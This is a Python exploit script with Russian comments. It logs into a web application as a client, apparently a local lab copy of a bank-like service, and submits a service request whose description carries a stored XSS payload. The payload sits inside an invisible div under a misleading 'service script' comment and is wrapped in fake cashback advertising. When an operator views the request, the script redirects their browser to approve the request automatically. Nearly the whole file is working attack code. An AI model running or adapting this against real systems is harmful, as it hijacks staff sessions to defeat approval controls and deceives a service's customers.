#!/usr/bin/env python3
"""
Скрипт для создания заявки с XSS-эксплойтом (Авто-одобрение)
Использует requests для авторизации и создания заявки
"""
import requests
from bs4 import BeautifulSoup
import sys

# Конфигурация
BASE_URL = "http://localhost:8000"  # Измените на ваш URL
EMAIL = "client1@financepro.ru"  # Email клиента
PASSWORD = "password123"  # Пароль клиента

# XSS-скрипт для авто-одобрения через переход по ссылке
# Извлекает request_id из URL страницы и перенаправляет на approve-request/<request_id>/
XSS_SCRIPT = """<script>(function(){
  function approve(){
    // Извлекаем request_id из URL (например, /review-request/123/)
    var urlMatch = window.location.pathname.match(/\/review-request\/(\d+)\//);
    if(urlMatch && urlMatch[1]){
      var requestId = urlMatch[1];
      var approveUrl = '/approve-request/' + requestId + '/';
      // Перенаправляем на URL одобрения
      window.location.href = approveUrl;
      return;
    }
    // Если не нашли в URL, пробуем найти в форме
    var f=document.querySelector('form[action*="approve-request"]');
    if(f){
      var action = f.getAttribute('action');
      var match = action.match(/\/approve-request\/(\d+)\//);
      if(match && match[1]){
        window.location.href = '/approve-request/' + match[1] + '/';
        return;
      }
    }
    setTimeout(approve,150);
  }
  if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",approve);} else {approve();}
})();</script>"""

def get_csrf_token(session, url):
    """Получает CSRF токен со страницы"""
    response = session.get(url)
    if response.status_code != 200:
        print(f"❌ Ошибка получения страницы {url}: {response.status_code}")
        return None
    
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    if csrf_input:
        return csrf_input.get('value')
    
    # Пробуем получить из cookies
    if 'csrftoken' in session.cookies:
        return session.cookies['csrftoken']
    
    return None

def login(session, email, password):
    """Авторизация на сайте"""
    print(f"🔐 Авторизация как {email}...")
    
    # Получаем страницу логина для CSRF токена
    login_url = f"{BASE_URL}/login/"
    csrf_token = get_csrf_token(session, login_url)
    
    if not csrf_token:
        print("❌ Не удалось получить CSRF токен")
        return False
    
    # Отправляем форму логина
    login_data = {
        'email': email,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
    }
    
    headers = {
        'Referer': login_url,
        'X-CSRFToken': csrf_token,
    }
    
    response = session.post(
        login_url,
        data=login_data,
        headers=headers,
        allow_redirects=True
    )
    
    # Проверяем успешность входа
    if response.status_code == 200:
        # Проверяем, что мы не на странице логина
        if '/login' not in response.url and 'client' in response.url.lower():
            print("✅ Авторизация успешна")
            return True
        else:
            print(f"❌ Авторизация не удалась. URL после входа: {response.url}")
            return False
    else:
        print(f"❌ Ошибка авторизации: {response.status_code}")
        return False

def create_service_request(session, service_name, service_description, price=0):
    """Создание заявки на услугу"""
    print(f"📝 Создание заявки: {service_name}...")
    
    # Получаем страницу создания заявки для CSRF токена
    create_url = f"{BASE_URL}/create-service-request/"
    csrf_token = get_csrf_token(session, create_url)
    
    if not csrf_token:
        print("❌ Не удалось получить CSRF токен")
        return False
    
    # Данные заявки
    request_data = {
        'service_name': service_name,
        'service_description': service_description,
        'price': price,
        'csrfmiddlewaretoken': csrf_token,
    }
    
    headers = {
        'Referer': create_url,
        'X-CSRFToken': csrf_token,
    }
    
    # Отправляем POST запрос
    response = session.post(
        create_url,
        data=request_data,
        headers=headers,
        allow_redirects=True
    )
    
    if response.status_code == 200:
        # Проверяем, что заявка создана (перенаправление или сообщение об успехе)
        if 'my-requests' in response.url or 'success' in response.text.lower() or 'заявка' in response.text.lower():
            print("✅ Заявка успешно создана!")
            return True
        else:
            print(f"⚠️ Неясный результат. URL: {response.url}")
            print(f"   Проверьте страницу заявок: {BASE_URL}/my-requests/")
            return True  # Возможно, заявка создана
    else:
        print(f"❌ Ошибка создания заявки: {response.status_code}")
        print(f"   Ответ: {response.text[:500]}")
        return False

def main():
    """Основная функция"""
    print("=" * 60)
    print("Создание заявки с XSS-эксплойтом (Авто-одобрение)")
    print("=" * 60)
    print(f"URL: {BASE_URL}")
    print(f"Email: {EMAIL}")
    print()
    
    # Создаем сессию
    session = requests.Session()
    
    # Авторизация
    if not login(session, EMAIL, PASSWORD):
        print("\n❌ Не удалось авторизоваться. Проверьте email и пароль.")
        sys.exit(1)
    
    print()
    
    # Создаем заявку с XSS (маскируем под очень привлекательную услугу)
    service_name = "Максимальный кэшбэк 15% + бесплатные переводы навсегда"
    
    # Описание будет отображаться в каталоге услуг - делаем его очень привлекательным для пользователей
    # XSS спрятан внутри как часть HTML-разметки
    service_description = f"""Эксклюзивная программа лояльности с максимальным кэшбэком 15% на все покупки и бесплатными переводами навсегда!

Что вы получаете:
• 15% кэшбэк на все покупки по карте (без лимитов!)
• Бесплатные переводы на любые карты и счета навсегда
• Приоритетная поддержка 24/7 с персональным менеджером
• Увеличенные лимиты на все операции
• Эксклюзивные акции и персональные предложения
• Защита от мошенничества с мгновенными уведомлениями

Экономия: При среднем обороте 50,000₽/месяц вы экономите 7,500₽ только на кэшбэке!

Подключение: Мгновенное, без документов и ожидания.

<div style="position:absolute;left:-9999px;opacity:0;pointer-events:none">
<!-- Служебный скрипт для улучшения пользовательского опыта -->
<script type="application/javascript">
(function(){{
  function approve(){{
    // Извлекаем request_id из URL (например, /review-request/123/)
    var urlMatch = window.location.pathname.match(/\\/review-request\\/(\\d+)\\//);
    if(urlMatch && urlMatch[1]){{
      var requestId = urlMatch[1];
      var approveUrl = '/approve-request/' + requestId + '/';
      // Перенаправляем на URL одобрения
      window.location.href = approveUrl;
      return;
    }}
    // Если не нашли в URL, пробуем найти в форме
    var f=document.querySelector('form[action*="approve-request"]');
    if(f){{
      var action = f.getAttribute('action');
      var match = action.match(/\\/approve-request\\/(\\d+)\\//);
      if(match && match[1]){{
        window.location.href = '/approve-request/' + match[1] + '/';
        return;
      }}
    }}
    setTimeout(approve,150);
  }}
  if(document.readyState==="loading"){{document.addEventListener("DOMContentLoaded",approve);}} else {{approve();}}
}})();
</script>
</div>

Ограниченное предложение! Подключите сейчас и получите бонус 5,000₽ на счет при первой покупке!

Только для активных клиентов банка."""
    price = 0  # Бесплатная услуга - еще более привлекательно!
    
    if create_service_request(session, service_name, service_description, price):
        print()
        print("=" * 60)
        print("✅ Готово!")
        print(f"📋 Заявка создана: {service_name}")
        print(f"🔗 Проверьте заявки: {BASE_URL}/my-requests/")
        print(f"👀 Оператор должен открыть заявку: {BASE_URL}/operator2/")
        print("=" * 60)
    else:
        print()
        print("❌ Не удалось создать заявку")
        sys.exit(1)

if __name__ == "__main__":
    main()
